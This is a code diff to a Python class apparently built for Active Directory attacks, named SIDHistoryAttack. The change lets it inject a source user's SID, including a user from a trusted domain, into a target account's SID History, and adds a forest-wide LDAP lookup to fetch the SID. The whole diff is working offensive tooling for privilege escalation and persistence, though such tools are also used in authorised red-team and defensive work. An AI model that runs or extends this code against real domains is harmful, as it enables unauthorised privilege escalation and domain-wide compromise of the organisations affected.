@@ -138,25 +138,75 @@ class SIDHistoryAttack:
             logging.error(f"Error adding SID to history: {e}")
             return False
 
-    def inject_sid_history(self, target_user: str, source_user: str) -> bool:
+    def inject_sid_history(self, target_user: str, source_user: str, 
+                          source_domain: Optional[str] = None) -> bool:
         """
         Inject the SID of a source user into the SID History of a target user.
 
         Args:
             target_user: sAMAccountName of the user to modify
             source_user: sAMAccountName of the user whose SID to inject
+            source_domain: Optional source domain for trusted domain injection
 
         Returns:
             True if successful, False otherwise
         """
-        logging.info(f"Injecting SID from {source_user} into {target_user}")
+        if source_domain:
+            logging.info(f"Injecting SID from {source_user}@{source_domain} into {target_user}")
+        else:
+            logging.info(f"Injecting SID from {source_user} into {target_user}")
 
-        source_sid = self.get_user_sid(source_user)
+        source_sid = self._get_user_sid_from_domain(source_user, source_domain)
         if not source_sid:
-            logging.error(f"Could not retrieve SID for source user {source_user}")
+            if source_domain:
+                logging.error(f"Could not retrieve SID for {source_user}@{source_domain}")
+                logging.error("If this is a trusted domain, you may need to provide the SID directly with --sid")
+            else:
+                logging.error(f"Could not retrieve SID for source user {source_user}")
             return False
 
         return self.add_sid_to_history(target_user, source_sid)
+
+    def _get_user_sid_from_domain(self, source_user: str, 
+                                  source_domain: Optional[str] = None) -> Optional[str]:
+        """
+        Get user SID from current domain or trusted domain.
+
+        Args:
+            source_user: sAMAccountName of the user
+            source_domain: Optional domain to search in (for trusted domains)
+
+        Returns:
+            SID as string or None if not found
+        """
+        if source_domain and source_domain.lower() != self.domain.lower():
+            # Try to search in trusted domain using current connection
+            # Note: This requires the trusted domain objects to be accessible
+            # via the current connection (forest-wide search)
+            logging.info(f"Searching for {source_user} in trusted domain {source_domain}")
+            
+            # Attempt forest-wide search
+            try:
+                # Try to find the user in the trusted domain
+                # For trusted domains, we search using the domain DN
+                source_base_dn = SIDConverter.domain_to_dn(source_domain)
+                
+                # Create temporary LDAPOperations with source domain base
+                temp_ldap_ops = LDAPOperations(self.connection, source_base_dn)
+                sid = temp_ldap_ops.get_user_sid(source_user)
+                if sid:
+                    return sid
+            except Exception as e:
+                logging.debug(f"Forest-wide search failed: {e}")
+            
+            # If forest-wide search doesn't work, we can't query the trusted domain
+            # User needs to provide SID directly
+            logging.warning(f"Cannot query trusted domain {source_domain} from current connection")
+            logging.warning(f"Please use --sid to provide the SID directly for {source_user}@{source_domain}")
+            return None
+        
+        # Search in current domain
+        return self.get_user_sid(source_user)
 
     def remove_sid_from_history(self, target_user: str, sid_to_remove: str) -> bool:
         """
